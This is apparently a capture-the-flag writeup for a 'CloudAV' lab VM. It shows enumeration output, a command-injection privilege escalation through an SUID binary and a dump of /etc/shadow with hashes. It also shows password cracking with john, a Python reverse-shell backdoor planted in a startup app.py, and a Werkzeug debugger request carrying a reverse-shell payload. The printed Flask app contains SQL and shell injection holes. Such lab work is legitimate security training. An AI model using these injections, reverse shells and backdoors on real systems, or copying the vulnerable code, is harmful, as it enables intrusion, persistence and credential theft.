+-rwxr-sr-x 3 root mail 14592 Dec  3  2012 /snap/core/5662/usr/bin/mail-lock
+-rwxr-sr-x 3 root mail 14592 Dec  3  2012 /snap/core/5662/usr/bin/mail-touchlock
+-rwxr-sr-x 3 root mail 14592 Dec  3  2012 /snap/core/5662/usr/bin/mail-unlock
+-rwxr-sr-x 1 root crontab 358624 Jan 18  2018 /snap/core/5662/usr/bin/ssh-agent
+-rwxr-sr-x 1 root tty 27368 May 16  2018 /snap/core/5662/usr/bin/wall
+-rwsr-sr-x 1 root root 98472 Oct  5  2018 /snap/core/5662/usr/lib/snapd/snap-confine
+-rwxr-sr-x 1 root shadow 35632 Apr  9  2018 /snap/core/4917/sbin/pam_extrausers_chkpwd
+-rwxr-sr-x 1 root shadow 35600 Apr  9  2018 /snap/core/4917/sbin/unix_chkpwd
+-rwxr-sr-x 1 root shadow 62336 May 17  2017 /snap/core/4917/usr/bin/chage
+-rwxr-sr-x 1 root systemd-network 36080 Apr  5  2016 /snap/core/4917/usr/bin/crontab
+-rwxr-sr-x 1 root mail 14856 Dec  7  2013 /snap/core/4917/usr/bin/dotlockfile
+-rwxr-sr-x 1 root shadow 22768 May 17  2017 /snap/core/4917/usr/bin/expiry
+-rwxr-sr-x 3 root mail 14592 Dec  3  2012 /snap/core/4917/usr/bin/mail-lock
+-rwxr-sr-x 3 root mail 14592 Dec  3  2012 /snap/core/4917/usr/bin/mail-touchlock
+-rwxr-sr-x 3 root mail 14592 Dec  3  2012 /snap/core/4917/usr/bin/mail-unlock
+-rwxr-sr-x 1 root crontab 358624 Jan 18  2018 /snap/core/4917/usr/bin/ssh-agent
+-rwxr-sr-x 1 root tty 27368 Nov 30  2017 /snap/core/4917/usr/bin/wall
+-rwsr-sr-x 1 root root 98440 Jun 21  2018 /snap/core/4917/usr/lib/snapd/snap-confine
+-rwxr-sr-x 1 root shadow 35632 Apr  9  2018 /snap/core/9066/sbin/pam_extrausers_chkpwd
+-rwxr-sr-x 1 root shadow 35600 Apr  9  2018 /snap/core/9066/sbin/unix_chkpwd
+-rwxr-sr-x 1 root shadow 62336 Mar 25  2019 /snap/core/9066/usr/bin/chage
+-rwxr-sr-x 1 root systemd-network 36080 Apr  5  2016 /snap/core/9066/usr/bin/crontab
+-rwxr-sr-x 1 root mail 14856 Dec  7  2013 /snap/core/9066/usr/bin/dotlockfile
+-rwxr-sr-x 1 root shadow 22768 Mar 25  2019 /snap/core/9066/usr/bin/expiry
+-rwxr-sr-x 3 root mail 14592 Dec  3  2012 /snap/core/9066/usr/bin/mail-lock
+-rwxr-sr-x 3 root mail 14592 Dec  3  2012 /snap/core/9066/usr/bin/mail-touchlock
+-rwxr-sr-x 3 root mail 14592 Dec  3  2012 /snap/core/9066/usr/bin/mail-unlock
+-rwxr-sr-x 1 root crontab 358624 Mar  4  2019 /snap/core/9066/usr/bin/ssh-agent
+-rwxr-sr-x 1 root tty 27368 Jan 27 14:28 /snap/core/9066/usr/bin/wall
+-rwxr-sr-x 1 root shadow 34816 Apr  5  2018 /sbin/unix_chkpwd
+-rwxr-sr-x 1 root shadow 34816 Apr  5  2018 /sbin/pam_extrausers_chkpwd
+
+
+[+] Files with POSIX capabilities set:
+/usr/bin/mtr-packet = cap_net_raw+ep
+
+
+[+] Private SSH keys found!:
+/home/scanner/LinEnum.sh
+
+
+[+] AWS secret keys found!:
+/home/scanner/LinEnum.sh
+
+
+[-] World-writable files (excluding /proc and /sys):
+--w--w--w- 1 root root 0 Apr 25 02:58 /var/lib/lxcfs/cgroup/memory/cgroup.event_control
+--w--w--w- 1 root root 0 Apr 25 02:58 /var/lib/lxcfs/cgroup/memory/user.slice/cgroup.event_control
+--w--w--w- 1 root root 0 Apr 25 02:58 /var/lib/lxcfs/cgroup/memory/system.slice/cgroup.event_control
+--w--w--w- 1 root root 0 Apr 25 02:58 /var/lib/lxcfs/cgroup/memory/system.slice/lxd-containers.service/cgroup.event_control
+--w--w--w- 1 root root 0 Apr 25 02:58 /var/lib/lxcfs/cgroup/memory/system.slice/lvm2-lvmetad.service/cgroup.event_control
+<SNIP>
+
+
+[-] NFS displaying partitions and filesystems - you need to check if exotic filesystems
+UUID=5ba19654-d567-11e8-98cf-080027baa5ba / ext4 defaults 0 0
+/swap.img       none    swap    sw      0       0
+
+
+[-] Can't search *.conf files as no keyword was entered
+
+[-] Can't search *.php files as no keyword was entered
+
+[-] Can't search *.log files as no keyword was entered
+
+[-] Can't search *.ini files as no keyword was entered
+
+[-] All *.conf files in /etc (recursive 1 level):
+-rw-r--r-- 1 root root 191 Feb  7  2018 /etc/libaudit.conf
+-rw-r--r-- 1 root root 2969 Feb 28  2018 /etc/debconf.conf
+-rw-r--r-- 1 root root 3028 Jul 25  2018 /etc/adduser.conf
+-rw-r--r-- 1 root root 1260 Feb 26  2018 /etc/ucf.conf
+-rw-r--r-- 1 root root 812 Mar 24  2018 /etc/mke2fs.conf
+-rw-r--r-- 1 root root 92 Apr  9  2018 /etc/host.conf
+-rw-r--r-- 1 root root 5898 Jul 25  2018 /etc/ca-certificates.conf
+-rw-r--r-- 1 root root 513 Jul 25  2018 /etc/nsswitch.conf
+-rw-r--r-- 1 root root 4861 Feb 22  2018 /etc/hdparm.conf
+-rw-r--r-- 1 root root 403 Mar  1  2018 /etc/updatedb.conf
+-rw-r--r-- 1 root root 34 Jan 27  2016 /etc/ld.so.conf
+-rw-r--r-- 1 root root 1358 Jan 30  2018 /etc/rsyslog.conf
+-rw-r--r-- 1 root root 2584 Feb  1  2018 /etc/gai.conf
+-rw-r--r-- 1 root root 6920 Oct 27  2017 /etc/overlayroot.conf
+-rw-r--r-- 1 root root 703 Aug 21  2017 /etc/logrotate.conf
+-rw-r--r-- 1 root root 110 Jul 25  2018 /etc/kernel-img.conf
+-rw-r--r-- 1 root root 2683 Jan 17  2018 /etc/sysctl.conf
+-rw-r--r-- 1 root root 100 Apr 11  2017 /etc/sos.conf
+-rw-r--r-- 1 root root 14867 Oct 13  2016 /etc/ltrace.conf
+-rw-r--r-- 1 root root 280 Jun 20  2014 /etc/fuse.conf
+-rw-r--r-- 1 root root 552 Apr  4  2018 /etc/pam.conf
+-rw-r--r-- 1 root root 350 Jul 25  2018 /etc/popularity-contest.conf
+-rw-r--r-- 1 root root 604 Aug 13  2017 /etc/deluser.conf
+
+
+[-] Current user's history files:
+-rw------- 1 scanner scanner 5 Oct 24  2018 /home/scanner/.bash_history
+
+
+[-] Location and contents (if accessible) of .bash_history file(s):
+/home/scanner/.bash_history
+exit
+
+
+[-] Any interesting mail in /var/mail:
+total 8
+drwxrwsr-x  2 root mail 4096 Jul 25  2018 .
+drwxr-xr-x 13 root root 4096 Jul 25  2018 ..
+
+
+### SCAN COMPLETE ####################################
+
+--------------------------------------------------------------------------
+
+$ wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
+	--2020-04-25 06:05:45--  https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
+	Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.120.133
+	Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.120.133|:443... connected.
+	HTTP request sent, awaiting response... 200 OK
+	Length: 84244 (82K) [text/plain]
+	Saving to: ‘linux-exploit-suggester.sh’
+
+	     0K .......... .......... .......... .......... .......... 60% 12.7M 0s
+	    50K .......... .......... .......... ..                   100% 5.32M=0.01s
+
+	2020-04-25 06:05:45 (8.23 MB/s) - ‘linux-exploit-suggester.sh’ saved [84244/84244]
+
+$ ls
+	cloudav_app
+	LinEnum.sh
+	linux-exploit-suggester.sh
+	update_cloudav
+	update_cloudav.c
+
+$ chmod +x linux-exploit-suggester.sh
+
+$ ./linux-exploit-suggester.sh
+
+	Available information:
+
+	Kernel version: 4.15.0
+	Architecture: x86_64
+	Distribution: ubuntu
+	Distribution version: 18.04
+	Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed
+	Package listing: from current OS
+
+	Searching among:
+
+	73 kernel space exploits
+	45 user space exploits
+
+	Possible Exploits:
+
+	cat: write error: Broken pipe
+	[+] [CVE-2018-18955] subuid_shell
+
+	   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1712
+	   Exposure: probable
+	   Tags: [ ubuntu=18.04 ]{kernel:4.15.0-20-generic},fedora=28{kernel:4.16.3-301.fc28}
+	   Download URL: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/45886.zip
+	   Comments: CONFIG_USER_NS needs to be enabled
+
+	[+] [CVE-2019-7304] dirty_sock
+
+	   Details: https://initblog.com/2019/dirty-sock/
+	   Exposure: less probable
+	   Tags: ubuntu=18.10,mint=19
+	   Download URL: https://github.com/initstring/dirty_sock/archive/master.zip
+	   Comments: Distros use own versioning scheme. Manual verification needed.
+
+	[+] [CVE-2019-18634] sudo pwfeedback
+
+	   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
+	   Exposure: less probable
+	   Tags: mint=19
+	   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
+	   Comments: sudo configuration requires pwfeedback to be enabled.
+
+	[+] [CVE-2017-0358] ntfs-3g-modprobe
+
+	   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1072
+	   Exposure: less probable
+	   Tags: ubuntu=16.04{ntfs-3g:2015.3.14AR.1-1build1},debian=7.0{ntfs-3g:2012.1.15AR.5-2.1+deb7u2},debian=8.0{ntfs-3g:2014.2.15AR.2-1+deb8u2}
+	   Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/41356.zip
+	   Comments: Distros use own versioning scheme. Manual verification needed. Linux headers must be installed. System must have at least two CPU cores.
+
+$ 
+
+
+
+==============================================================================================================================
+Step 4. Privilege escalation to root
+==============================================================================================================================
+
+An SUID root binary 'update_cloudav' is vulnerable to an OS command injection
+=> OS command execution as ROOT
+
+
+$ ls -al
+	total 60
+	drwxr-xr-x 6 scanner scanner 4096 Oct 24  2018 .
+	drwxr-xr-x 4 root    root    4096 Oct 21  2018 ..
+	-rw------- 1 scanner scanner    5 Oct 24  2018 .bash_history
+	-rw-r--r-- 1 scanner scanner  220 Oct 21  2018 .bash_logout
+	-rw-r--r-- 1 scanner scanner 3771 Oct 21  2018 .bashrc
+	drwx------ 2 scanner scanner 4096 Oct 21  2018 .cache
+	drwxrwxr-x 4 scanner scanner 4096 Apr 25 02:00 cloudav_app
+	drwx------ 3 scanner scanner 4096 Oct 21  2018 .gnupg
+	drwxrwxr-x 3 scanner scanner 4096 Oct 21  2018 .local
+	-rw-r--r-- 1 scanner scanner  807 Oct 21  2018 .profile
+	-rw-rw-r-- 1 scanner scanner   66 Oct 21  2018 .selected_editor
+	-rwsr-xr-x 1 root    scanner 8576 Oct 24  2018 update_cloudav
+	-rw-rw-r-- 1 scanner scanner  393 Oct 24  2018 update_cloudav.c
+
+
+$ cat update_cloudav.c
+	#include <stdio.h>
+
+	int main(int argc, char *argv[])
+	{
+	char *freshclam="/usr/bin/freshclam";
+
+	if (argc < 2){
+	printf("This tool lets you update antivirus rules\nPlease supply command line arguments for freshclam\n");
+	return 1;
+	}
+
+	char *command = malloc(strlen(freshclam) + strlen(argv[1]) + 2);
+	sprintf(command, "%s %s", freshclam, argv[1]);
+	setgid(0);
+	setuid(0);
+	system(command);
+	return 0;
+
+	}
+
+$ cd ..
+
+$ ls
+	cloudav_app
+	LinEnum.sh
+	update_cloudav
+	update_cloudav.c
+
+$ ./update_cloudav test
+	ERROR: Problem with internal logger (UpdateLogFile = /var/log/clamav/freshclam.log).
+	ERROR: initialize: libfreshclam init failed.
+	ERROR: Initialization error!
+	ERROR: /var/log/clamav/freshclam.log is locked by another process
+
+
+$ ./update_cloudav 'test;id'
+	ERROR: Problem with internal logger (UpdateLogFile = /var/log/clamav/freshclam.log).
+	ERROR: initialize: libfreshclam init failed.
+	ERROR: Initialization error!
+	ERROR: /var/log/clamav/freshclam.log is locked by another process
+	uid=0(root) gid=0(root) groups=0(root),1001(scanner)
+
+
+$ ./update_cloudav '-u;cat /etc/shadow'
+	/usr/bin/freshclam: option requires an argument -- u
+	ERROR: Incomplete option passed (missing argument)
+	ERROR: Can't parse command line options
+	root:*:17737:0:99999:7:::
+	daemon:*:17737:0:99999:7:::
+	bin:*:17737:0:99999:7:::
+	sys:*:17737:0:99999:7:::
+	sync:*:17737:0:99999:7:::
+	games:*:17737:0:99999:7:::
+	man:*:17737:0:99999:7:::
+	lp:*:17737:0:99999:7:::
+	mail:*:17737:0:99999:7:::
+	news:*:17737:0:99999:7:::
+	uucp:*:17737:0:99999:7:::
+	proxy:*:17737:0:99999:7:::
+	www-data:*:17737:0:99999:7:::
+	backup:*:17737:0:99999:7:::
+	list:*:17737:0:99999:7:::
+	irc:*:17737:0:99999:7:::
+	gnats:*:17737:0:99999:7:::
+	nobody:*:17737:0:99999:7:::
+	systemd-network:*:17737:0:99999:7:::
+	systemd-resolve:*:17737:0:99999:7:::
+	syslog:*:17737:0:99999:7:::
+	messagebus:*:17737:0:99999:7:::
+	_apt:*:17737:0:99999:7:::
+	lxd:*:17737:0:99999:7:::
+	uuidd:*:17737:0:99999:7:::
+	dnsmasq:*:17737:0:99999:7:::
+	landscape:*:17737:0:99999:7:::
+	pollinate:*:17737:0:99999:7:::
+	sshd:*:17737:0:99999:7:::
+	cloudav:$6$773ldDmF$CaZXUQJvy8TaPeqDorRSpQlzvzkD2SlJOTGbkcFgmk0CMpenEpM8xKOEyq82uBMTGOLZQrXvLwZmhgRx/OqE71:17825:0:99999:7:::
+	scanner:$6$b6Aw2gKK$ZNfe/kxHAPLsyYAnwCaRGdK3skcaDIwr/JaQ7Jshtb65JHRgMbEfOQQtKFa1Z2D0Fjr4AjcY8oSV7DKsFyUBN/:17825:0:99999:7:::
+	clamav:!:17825:0:99999:7:::
+$ 
+
+
+
+jeff@kali:~/Documents/CTFs/CloudAV$ sudo john --wordlist=/usr/share/wordlists/rockyou.txt John-cloudav-pwd.txt 
+[sudo] password for jeff: 
+Using default input encoding: UTF-8
+Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+scanner          (scanner)
+
+
+
+jeff@kali:~/Documents/CTFs/CloudAV$ ssh scanner@192.168.1.27
+scanner@192.168.1.27's password: 
+
+Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-36-generic x86_64)
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+  System information as of Sat Apr 25 19:04:48 UTC 2020
+  System load:  0.08              Processes:             92
+  Usage of /:   53.9% of 9.78GB   Users logged in:       0
+  Memory usage: 15%               IP address for enp0s3: 192.168.1.27
+  Swap usage:   0%
+ * Security certifications for Ubuntu!
+   We now have FIPS, STIG, CC and a CIS Benchmark.
+   - http://bit.ly/Security_Certification
+ * Want to make a highly secure kiosk, smart display or touchscreen?
+   Here's a step-by-step tutorial for a rainy weekend, or a startup.
+   - https://bit.ly/secure-kiosk
+215 packages can be updated.
+87 updates are security updates.
+Last login: Sat Apr 25 18:52:23 2020 from 192.168.1.22
+
+scanner@cloudav:~$ pwd
+/home/scanner
+
+scanner@cloudav:~$ ls
+cloudav_app  update_cloudav  update_cloudav.c
+
+scanner@cloudav:~$ ./update_cloudav 'test;bash'
+ERROR: /var/log/clamav/freshclam.log is locked by another process
+ERROR: Problem with internal logger (UpdateLogFile = /var/log/clamav/freshclam.log).
+ERROR: initialize: libfreshclam init failed.
+ERROR: Initialization error!
+root@cloudav:~# 
+
+root@cloudav:~# id
+uid=0(root) gid=0(root) groups=0(root),1001(scanner)
+
+
+
+
+
+Other 
+=========================
+
+
+adding a backdoor into app.py...that is run at startup by a cron task...
+
+
+from flask import Flask, render_template, request, session
+import sqlite3
+import subprocess
+import os
+import socket
+
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.22",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);
+
+conn = sqlite3.connect('database.sql',check_same_thread = False)
+c = conn.cursor()
+
+app = Flask(__name__)
+
+@app.route('/')
+def index():
+    return render_template('index.html')
+
+@app.route('/login', methods=['POST'])
+def login():
+    password = request.form['password']
+    if len(c.execute('select * from code where password="' + password + '"').fetchall()) > 0:
+        session['logged_in'] = True
+        return 'Redirecting to /scan. <meta http-equiv="refresh" content="0; url=/scan" />'
+    else:
+        return "WRONG INFORMATION"
+
+@app.route('/scan')
+def shop():
+    if session.get('logged_in'):
+        filelist = subprocess.Popen("ls -l /home/scanner/cloudav_app/samples", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE).stdout.read()
+        return render_template('scan.html',filelist=filelist)
+    else:
+        return '<meta http-equiv="refresh" content="0; url=/" />'
+
+@app.route('/output', methods=['POST'])
+def output():
+    if session.get('logged_in'):
+        filename = request.form['filename']
+        scan_results = subprocess.Popen("clamscan "+filename, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE).stdout.read()
+        return "<pre>" + scan_results + "</pre>"
+    else:
+        return '<meta http-equiv="refresh" content="0; url=/" />'
+
+if __name__ == "__main__":
+    app.secret_key = os.urandom(12)
+    app.run(host='0.0.0.0',port=8080, debug=True)
+
+
+
+--------------------------------------------
+--------------------------------------------
+
+Note: A werkzeug python debugging interface is reachable and may be used to get a remote shell however I did not managed to exploit it and got 405 and 404 error messages.
+(Note: the 'pin code' protection is a 'client-side' control that can be bypassed by simply deleting a few Javascript lines in the HTTP responses)
+
+
+GET /login?__debugger__=yes&cmd=import+socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket(socket.AF_INET%2Csocket.SOCK_STREAM)%3Bs.connect((%22192.168.1.22%22%2C1234))%3Bos.dup2(s.fileno()%2C0)%3B+os.dup2(s.fileno()%2C1)%3B+os.dup2(s.fileno()%2C2)%3Bp%3Dsubprocess.call(%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D)%3B&frm=139636193626256&s=euOQhKfcZjQRyk1zU8kf HTTP/1.1
+Host: 192.168.1.5:8080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.1.5:8080/login
+X-Requested-With: XMLHttpRequest
+Connection: close
+Cookie: session=eyJsb2dnZWRfaW4iOnRydWV9.XqPLlA.EMZ2x6G5nLqyu8KReI2NdolWUms
+
+
+HTTP/1.0 405 METHOD NOT ALLOWED
+Content-Type: text/html
+Allow: POST, OPTIONS
+Content-Length: 178
+Server: Werkzeug/0.14.1 Python/2.7.15rc1
+Date: Sat, 25 Apr 2020 05:36:32 GMT
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+<title>405 Method Not Allowed</title>
+<h1>Method Not Allowed</h1>
+<p>The method is not allowed for the requested URL.</p>
+
